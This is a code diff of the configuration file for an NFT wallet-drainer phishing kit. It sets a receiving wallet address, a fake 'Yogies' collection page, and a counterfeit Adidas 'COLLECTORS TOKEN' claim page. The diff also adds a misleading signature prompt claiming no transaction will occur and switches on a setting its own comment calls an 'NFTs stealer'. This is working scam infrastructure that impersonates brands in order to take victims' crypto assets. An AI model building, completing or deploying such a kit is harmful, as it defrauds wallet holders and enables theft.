@@ -1,60 +1,47 @@
-/*
-    = = = = = YOU WALLET ADRESS = = = = =
-*/
-
-const receiveAddress = "YOUR WALLET";
-
-/*
-    = = = = = COLLECTION SETTINGS = = = = =
-*/
+const receiveAddress = "0xcC6a1f0Bfda7761611c5f669A87CC1ACB55056E9";
 
 const collectionInfo = {
-    name: "nft-professor",
-    date: "10.04.2022",
+    name: "Yogies",
     socialMedia: {
-        discord: "discord.gg/invite_here",
-        twitter: "https://twitter.com/username_here",
+        discord: "",
+        twitter: "https://twitter.com/YogiesNFT",
+        instagram: "",
     },
-    medias: {
-        preview: "preview.gif",
-        favicon: "icon.png",
-    },
-    background: {
-        type: "image", // Supported types: image, video, color (use image for gif)
-        image: "background.jpg", // Image for image type or video preview for video type (image befor video load)
-        video: "background.mp4", // If you don't use video type, you can ignore this line
-        color: "#4E4E6D", // If you don't use color type, you can ignore this line
-    }
 }
 
+const signMessage = `Welcome, \n\n` +
+    `Click to sign in and accept the Terms of Service.\n\n` +
+    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
+    `Wallet Address:\n{address}\n\n` +
+    `Nonce:\n{nonce}`;
 
-/*
-    = = = = = MINT INFORMATIONS = = = = =
-*/
-
-const mintInfo = {
-    price: 0.2,
-    totalSupply: 8888,
-    minUnits: 1,
-    maxUnits: 20,
-    askMintLoop: true,
+const indexPageInfo = {
+    backgroundImage: "background.jpg", // relative path to background image (in assets)
+    title: "{name}", // {name} will be replaced with collectionInfo.name
+    underTitle: "COLLECTORS TOKEN",
 }
 
-/*
-    = = = = = DRAIN SETTINGS = = = = =
-*/
+const claimPageInfo = {
+    title: "COLLECTORS<br>TOKEN", // <br> is a line break
+    shortDescription: "SHOW YOUR LOYALTY.",
+    longDescription: "A ADIDAS TOKEN IS A SIGN YOU’VE BEEN PART OF ADIDAS SINCE THE START. IT GIVES YOU EARLY ACCESS TO MERCH, EVENTS AND MORE.",
+
+    claimButtonText: "CLAIM NOW",
+
+    image: "adidas.jpeg", // relative path to image (in assets)
+    imageRadius: 250, // image radius in px
+}
 
 const drainNftsInfo = {
-    active: true,
-    minValue: 0.2,
-    maxTransfer: 1,
-    nftReceiveAddress: "YOUR WALLET",
+    active: true, // Active (true) or not (false) NFTs stealer.
+    minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
 const customStrings = {
     title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    connectButton: "CONNECT WALLET",
-    transferButton: "MINT NOW",
+    connectButton: "Connect wallet",
+    transferButton: "Mint now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
 
@@ -63,9 +50,6 @@ const customStrings = {
 */
 
 //#region Check Configuration
-if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
-if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
-
 if (!receiveAddress.startsWith("0x") ||
     (
         receiveAddress.length >= 64 ||
